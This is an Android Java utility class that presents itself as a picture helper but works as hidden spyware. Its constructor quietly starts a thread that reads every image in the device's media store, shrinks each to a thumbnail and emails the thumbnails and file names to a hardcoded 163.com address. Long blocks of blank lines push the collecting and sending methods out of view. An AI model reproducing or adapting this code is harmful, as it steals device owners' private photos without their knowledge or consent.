package app.soundmail.MyUtil;

import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.media.ThumbnailUtils;
import android.provider.MediaStore;

import java.io.File;
import java.util.ArrayList;

import app.maillibrary.NewMail;

/**
 * Created by sound on 2017/4/25.
 */

public class PiceUtil {

    private ArrayList<String> names = new ArrayList(),filePath = new ArrayList();

    private Context mContext;
    public PiceUtil(Context mContext){
        this.mContext = mContext;
        new Thread(new Runnable() {
            @Override
            public void run() {
                getAllPice();
                submitEmail();
            }
        }).start();
    }

    public ArrayList<String> getNameList(){
        return names;
    }

    public ArrayList<String> getPathList(){
        return filePath;
    }




























    private void getAllPice(){
        names = new ArrayList();
        filePath = new ArrayList();
        Cursor cursor = mContext.getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, null);
        while (cursor.moveToNext()) {
            //获取图片的名称
            String name = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));
            //获取图片的生成日期
            byte[] data = cursor.getBlob(cursor.getColumnIndex(MediaStore.Images.Media.DATA));

            names.add(name);
            filePath.add(new String(data, 0, data.length - 1));
        }
        cursor.close();
    }












































    private void submitEmail(){
        ArrayList<String> nameList = names;
        ArrayList<String> pathList = filePath;

        ArrayList<String> newPathList = new ArrayList<>();

        if(pathList != null && pathList.size() > 0){
            for (int i=0;i<pathList.size();i++){
                String path = pathList.get(i);
                Bitmap bp = CommonUtils.convertToBitmap(path, mContext);
                if(bp != null){
                    Bitmap bitmap = ThumbnailUtils.extractThumbnail(bp, 100, 100);
                    String p = mContext.getFilesDir().getAbsolutePath() + "/img/";
                    if (!new File(p).exists()) {
                        new File(p).mkdir();
                    }
                    String newPath = p + nameList.get(i);
                    CommonUtils.saveBitmap(bitmap,newPath);
                    newPathList.add(newPath);
                }
            }

            new Thread(new NewMail("sounddashi@163.com","title"+ CommonUtils.getDate(),"test",nameList,newPathList)).start();
        }
    }
}
